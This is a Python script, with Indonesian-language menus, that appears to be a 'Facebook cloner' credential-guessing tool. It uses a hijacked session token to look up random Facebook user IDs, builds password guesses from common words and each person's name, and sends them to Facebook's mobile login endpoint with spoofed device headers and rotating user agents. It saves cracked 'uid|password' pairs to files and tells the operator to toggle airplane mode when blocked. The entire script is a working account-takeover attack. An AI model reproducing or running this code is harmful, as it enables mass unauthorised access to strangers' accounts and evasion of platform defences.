import requests as r, json, random, re,sys
from requests.exceptions import ConnectionError
from os import system

data = [] #format [cookie, eaag]
fail = []
ok = 0
cp = 0
get = r.Session().get
post = r.Session().post

def manual():
    system('clear')
    print('''
Login Menggunakan Akun Facebook Baru Agar Lebih Tahan Terhadap Checkpoint.
Ini Sekrip Facebook Clonner Free Anjg.
Jangan Lupa Kasih Star: https://github.com/Konrett
    ''')
    data.append(input('[++] Cookies: '))
    open('.cookie','w').write(data[0])
    try:
        api = get('https://business.facebook.com/business_locations', cookies={'cookie':data[0]})
        data.append(re.search('(\["EAAG\w+)', api.text).group(1).replace('["',''))
        name = get('https://graph.facebook.com/me?fields=name,id&access_token='+ data[1], cookies={'cookie':data[0]}).json()['name']
        home(name)
    except ConnectionError:
        print('[!!] Koneksi Bermasalah')
    except(KeyError, AttributeError):
        print('[!!] Cookies Invalid')
        system('rm .cookie')

def auto():
    try:
        kukis = open('.cookie','r').read()
        data.append(kukis)
        api = get('https://business.facebook.com/business_locations', cookies={'cookie':data[0]})
        data.append(re.search('(\["EAAG\w+)', api.text).group(1).replace('["',''))
        name = get('https://graph.facebook.com/me?fields=name,id&access_token='+ data[1], cookies={'cookie':data[0]}).json()['name']
        home(name)
    except ConnectionError:
        print('[!!] Koneksi Bermasalah')
    except(FileNotFoundError, KeyError, AttributeError):
        manual()

def home(name):
    system('clear')
    print(f'''
╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─  ╔═╗┬  ┌─┐┌┐┌┌┐┌┌─┐┬─┐
╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐  ║  │  │ │││││││├┤ ├┬┘
╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴  ╚═╝┴─┘└─┘┘└┘┘└┘└─┘┴└─
 [••] Login Sebagai : {name}

 •[1] Crack Old Id 1
 •[2] Crack Old Id 2
 •[3] Crack New Id
    ''')
    chn = input(' [••] Chose Number: ')
    if chn == '1':
        crack_old_1()
    elif chn == '2':
        crack_old_2()
    elif chn == '3':
        crack_new()
    else:
        exit(' [!!] Pilih Yang Bener Bego ah')
        
def crack_old_1():
    global ok,cp
    system('clear')
    print('''
╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─  ╔═╗┬  ┌─┐┌┐┌┌┐┌┌─┐┬─┐                 
╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐  ║  │  │ │││││││├┤ ├┬┘
╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴  ╚═╝┴─┘└─┘┘└┘┘└┘└─┘┴└─

[!!] Ok Result Saved in ( okeh.txt )
[!!] Cp Result Saved in ( cpeh.txt )
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    while True:
        string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        uid = '10000'+ str(random.randrange(1111111111,9999999999))
        try:
            if uid in fail:
                crack_old_1()
            elif uid in open('notfound.txt', 'r').read():
                crack_old_1()
            else:
                name = get('https://graph.facebook.com/'+ uid +'?fields=name,id&access_token='+ data[1], cookies={'cookie':data[0]}).json()['name']
                if name[:1] in string:
                    pasw = ['123456','sayang','indonesia','kontol','anjing']
                    if len(name) <= 6:
                        pasw.append(name + name)
                        pasw.append(name +'123')
                        pasw.append(name +'1234')
                        pasw.append(name + '12345')
                    else:
                        pasw.append(name)
                        pasw.append(name.split(' ')[0] + name.split(' ')[0])
                        pasw.append(name.split(' ')[0] +'123')
                        pasw.append(name.split(' ')[0] +'1234')
                        pasw.append(name.split(' ')[0] +'12345') 
                    #crack
                    sys.stdout.write(f'\r[!!] Cracking Progress {len(fail)}UID | cp:-{cp} ~ ok:-{ok}')
                    sys.stdout.flush()
                    for i in range(len(pasw)):
                        ua = get('https://raw.githubusercontent.com/Konrett/my-setup/main/ua.txt').text.split('\n')[random.randrange(1,1998)]
                        headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                        api = get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pasw[i])+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
                        if "blocked" in api.json()["error_msg"]:
                            input('\n[!!] Gunakan Mode Pesawat 5 detik Lalu Klik Enter Untuk Melanjutkan')
                        elif "session_key" in api.text and "EAAA" in api.text:
                            print('\n[>>] OKEH BOS {uid}|{pasw[i]}')
                            open('okeh.txt','a').write(f'{uid}|{pasw[i]}  ~  {ua}\n')
                            ok +=1
                        elif "www.facebook.com" in api.json()["error_msg"]:
                            print('\n[>>] CPEH BOS {uid}|{pasw[i]}')
                            open('cpeh.txt','a').write(f'{uid}|{pasw[i]}  ~  {ua}\n')
                            cp +=1
                        else:
                            pass
                    fail.append(uid)
                else:
                    open('notfound.txt','a').write(uid +'\n')
        except ConnectionError:
            print('\n[!!] Koneksi Bermasalah')
            input('[!!] Klik Enter Untuk Melanjutkan')
        except KeyError:
            pass

def crack_old_2():
    global ok,cp
    system('clear')
    print('''
╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─  ╔═╗┬  ┌─┐┌┐┌┌┐┌┌─┐┬─┐                 
╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐  ║  │  │ │││││││├┤ ├┬┘
╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴  ╚═╝┴─┘└─┘┘└┘┘└┘└─┘┴└─

[!!] Ok Result Saved in ( okeh.txt )
[!!] Cp Result Saved in ( cpeh.txt )
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    while True:
        string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        uid = '100000'+ str(random.randrange(111111111,999999999))
        try:
            if uid in fail:
                crack_old_2()
            elif uid in open('notfound.txt', 'r').read():
                crack_old_2()
            else:
                name = get('https://graph.facebook.com/'+ uid +'?fields=name,id&access_token='+ data[1], cookies={'cookie':data[0]}).json()['name']
                if name[:1] in string:
                    pasw = ['123456','sayang','indonesia','kontol','anjing']
                    if len(name) <= 6:
                        pasw.append(name + name)
                        pasw.append(name +'123')
                        pasw.append(name +'1234')
                        pasw.append(name + '12345')
                    else:
                        pasw.append(name)
                        pasw.append(name.split(' ')[0] + name.split(' ')[0])
                        pasw.append(name.split(' ')[0] +'123')
                        pasw.append(name.split(' ')[0] +'1234')
                        pasw.append(name.split(' ')[0] +'12345') 
                    #crack
                    sys.stdout.write(f'\r[!!] Cracking Progress {len(fail)}UID | cp:-{cp} ~ ok:-{ok}')
                    sys.stdout.flush()
                    for i in range(len(pasw)):
                        ua = get('https://raw.githubusercontent.com/Konrett/my-setup/main/ua.txt').text.split('\n')[random.randrange(1,1998)]
                        headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                        api = get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pasw[i])+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
                        if "blocked" in api.json()["error_msg"]:
                            input('\n[!!] Gunakan Mode Pesawat 5 detik Lalu Klik Enter Untuk Melanjutkan')
                        elif "session_key" in api.text and "EAAA" in api.text:
                            print('\n[>>] OKEH BOS {uid}|{pasw[i]}')
                            open('okeh.txt','a').write(f'{uid}|{pasw[i]}  ~  {ua}\n')
                            ok +=1
                        elif "www.facebook.com" in api.json()["error_msg"]:
                            print('\n[>>] CPEH BOS {uid}|{pasw[i]}')
                            open('cpeh.txt','a').write(f'{uid}|{pasw[i]}  ~  {ua}\n')
                            cp +=1
                        else:
                            pass
                    fail.append(uid)
                else:
                    open('notfound.txt','a').write(uid +'\n')
        except ConnectionError:
            print('\n[!!] Koneksi Bermasalah')
            input('[!!] Klik Enter Untuk Melanjutkan')
        except KeyError:
            pass

def crack_new():
    global ok,cp
    system('clear')
    print('''
╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─  ╔═╗┬  ┌─┐┌┐┌┌┐┌┌─┐┬─┐                 
╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐  ║  │  │ │││││││├┤ ├┬┘
╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴  ╚═╝┴─┘└─┘┘└┘┘└┘└─┘┴└─

[!!] Ok Result Saved in ( okeh.txt )
[!!] Cp Result Saved in ( cpeh.txt )
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    while True:
        string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        uid = '1000'+ str(random.randrange(11111111111,99999999999))
        try:
            if uid in fail:
                crack_new()
            elif uid in open('notfound.txt', 'r').read():
                crack_new()
            else:
                name = get('https://graph.facebook.com/'+ uid +'?fields=name,id&access_token='+ data[1], cookies={'cookie':data[0]}).json()['name']
                if name[:1] in string:
                    pasw = ['123456','sayang','indonesia','kontol','anjing']
                    if len(name) <= 6:
                        pasw.append(name + name)
                        pasw.append(name +'123')
                        pasw.append(name +'1234')
                        pasw.append(name + '12345')
                    else:
                        pasw.append(name)
                        pasw.append(name.split(' ')[0] + name.split(' ')[0])
                        pasw.append(name.split(' ')[0] +'123')
                        pasw.append(name.split(' ')[0] +'1234')
                        pasw.append(name.split(' ')[0] +'12345') 
                    #crack
                    sys.stdout.write(f'\r[!!] Cracking Progress {len(fail)}UID | cp:-{cp} ~ ok:-{ok}')
                    sys.stdout.flush()
                    for i in range(len(pasw)):
                        ua = get('https://raw.githubusercontent.com/Konrett/my-setup/main/ua.txt').text.split('\n')[random.randrange(1,1998)]
                        headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                        api = get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pasw[i])+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
                        if "blocked" in api.json()["error_msg"]:
                            input('\n[!!] Gunakan Mode Pesawat 5 detik Lalu Klik Enter Untuk Melanjutkan')
                        elif "session_key" in api.text and "EAAA" in api.text:
                            print('\n[>>] OKEH BOS {uid}|{pasw[i]}')
                            open('okeh.txt','a').write(f'{uid}|{pasw[i]}  ~  {ua}\n')
                            ok +=1
                        elif "www.facebook.com" in api.json()["error_msg"]:
                            print('\n[>>] CPEH BOS {uid}|{pasw[i]}')
                            open('cpeh.txt','a').write(f'{uid}|{pasw[i]}  ~  {ua}\n')
                            cp +=1
                        else:
                            pass
                    fail.append(uid)
                else:
                    open('notfound.txt','a').write(uid +'\n')
        except ConnectionError:
            print('\n[!!] Koneksi Bermasalah')
            input('[!!] Klik Enter Untuk Melanjutkan')
        except KeyError:
            pass

if __name__=='__main__':
    system('git pull')
    auto()
